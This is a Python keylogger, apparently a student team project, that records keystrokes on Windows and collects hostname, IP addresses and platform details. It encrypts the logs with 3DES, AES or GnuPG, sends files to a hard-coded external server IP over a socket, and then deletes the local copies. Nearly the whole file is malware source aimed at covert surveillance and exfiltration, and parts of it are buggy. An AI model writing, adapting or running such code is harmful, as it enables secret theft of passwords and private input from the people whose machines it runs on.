#Team myKeys
#keylogger.py
#Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins, !!add rest of your names here!!

# Libraries Used
import base64
import socket
import platform

from Cryptodome import Random
from Cryptodome.Cipher import AES, DES3
from Cryptodome.Random import get_random_bytes
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
import multiprocessing

import gnupg
from random import SystemRandom

from cryptography.fernet import Fernet


loggedKeys = "loggedKeys.txt"
systemInfo = "systemInfo.txt"

loggedKeysEncrypted = "loggedKeysEncrypted.txt"
systemInfoEncrypted = "systemInfoEncrypted.txt"

## Networking Variables
udpPort = 25005
buffer_size = 1024
server_ip = "35.231.244.179" #local testing

# payload destination variables
path = "C:\Windows\Temp"
extend = "\\"
extendedPath = path + extend

# varubales for AES:
BS = 16
PAD = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode('utf-8')
UNPAD = lambda s: s[:-ord(s[len(s) - 1:])]
BLOCK_SIZE = 128


### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
def sendFile(filename, isSysInfo):
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    f = open(filename, 'rb')
    if (not isSysInfo):
        sent_data = "incoming_keylog"
    else:
        sent_data = "incoming_sysinfo"
    clientsocket.send(sent_data.encode())
    l = f.read(buffer_size)
    while (l):
        clientsocket.sendto(l.encode(), (server_ip, udpPort))
        l = f.read(buffer_size)
    f.close()
    clientsocket.close()


### This creates a document that contains useful system information and specifications ###
def getSystemInfo():
    #needs error handling
    with open(extendedPath + systemInfo, "a") as f:
        hostname = socket.gethostname()
        # Writes hostname
        try:
            f.write("Hostname: " + hostname + '\n')
        
        except Exception:
           f.write("ERROR: could not retrieve Hostname" + '\n') 
        
        # Writes Public IP address
        privateIP = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP address: " + publicIP + '\n')

        except Exception:
            f.write("ERROR: could not retrieve public IP address" + '\n')

        # Writes Private IP
        try:
            f.write("private IP address: " + privateIP + '\n')

        except Exception:
            f.write("ERROR: could not retrieve private IP address" + '\n')

        # Writes Machine Name
        try:
            f.write("Machine: " + platform.machine() + '\n')

        except Exception:
            f.write("ERROR: could not retrieve machine name" + '\n')

        # Writes System Type
        try:
            f.write("System: "+ platform.system() + '\n')

        except Exception:
            f.write("ERROR: could not retrieve system type" + '\n')

        # Writes System Version
        try:
            f.write("Version: "+ platform.version() +'\n')
        
        except Exception:
            f.write("ERROR: could not retrieve platform version" + '\n')

        # Writes Processor
        try:
            f.write("Processor: " + platform.processor() + '\n')
        
        except Exception:
            f.write("ERROR: could not retrieve processor info" + '\n')

# gets system info and writes to file
getSystemInfo()

### Run Length Variables ###
numberOfLogs = 1
logTime = 86400 #This should be 24 hours equivalent (I think)
currentTime = time.time()
endTime = currentTime + logTime #Will result in 24 hours after currentTime


### Establishes how long the program will record keys ###
      ### All Key Recording Processes are below ###
while currentTime < endTime:
    count = 0
    keys = []

    ### When a key is pressed ###
    def onPress(key):
        global keys
        global count
        global currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeToFile(keys)
            keys = []

    ### Writes keys to file ###
    def writeToFile(keys):
        #needs error handling
        with open(extendedPath + loggedKeys, "a") as f:
            for key in keys:
                k = str(key.replace("'",""))
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    ### When a key is released ###
    def onRelease(key):
        # This may not be needed
        if key == Key.esc:
            return False 
        if currentTime > endTime:
            return False

    with Listener(onPress = onPress, onRelease = onRelease) as listener:
        listener.join()

    if currentTime > endTime:
        #needs error handling
        with open(extendedPath + loggedKeys, "w") as f:
            f.write()
        
        numberOfLogs += 1

        currentTime = time.time()
        endTime = time.time() + logTime

    


### ENCRYPT FILES HERE ###
#PGP encryption

# encrypt files
def des3_encrypt(original_file, encrypt_file, key):
    with open(original_file, 'rb') as files:
        data = files.read()
    iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
    cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
    pad_len = 8 - len(data) % 8
    # length of padding
    padding = chr(pad_len) * pad_len
    # PKCS5 padding content
    data += padding.encode('utf-8')
    encrypted_text = cipher_encrypt.encrypt(data)
    with open(encrypt_file, 'wb') as f:
        f.write(encrypted_text)
    return key, iv


def encrypt_aes(original_file, encrypt_file, key):
    # encrypt the file with the key and aes and return the encrypt text

    with open(original_file, 'rb') as files:
        data = files.read()
    new_text = PAD(data)
    iv = Random.new().read(BS)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(encrypt_file, 'wb') as f:
        f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
    return key


def encrypt_gnupg(original_file, encrypt_file, email, pashprase, key):
    # encrypt file name original_file
    # output in the dir and the encrypt file that we entered
    gpg = gnupg.GPG(gnupghome='C:\\Program Files (x86)\\GnuPG\\bin',
                    gpgbinary='C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe')

    with open(original_file, 'rb') as f:
        status = gpg.encrypt_file(
            f, recipients=[email],
            output=encrypt_file + '.gpg')
    return key



# Fernet Encryption - May be implemented later
# def fernetEncrypt():
#     filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
#     encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]

#     count = 0

#     for encryptingFile in filesToEncrypt:

#         with open(filesToEncrypt[count], 'rb') as f:
#             data = f.read()

#         fernet = Fernet(key)
#         encrypted = fernet.encrypt(data)

#         with open(encryptedFileNames[count], 'wb') as f:
#             f.write(encrypted)

#         ### SEND ENCRYPTED FILES TO SERVER HERE ###
#         #sendFile()
#         count += 1

#     time.sleep(120)


### Deletes Files After they are Encrypted and Sent ###
deleteFiles = [systemInfo,loggedKeys]
for file in deleteFiles:
    os.remove(extendedPath + file)
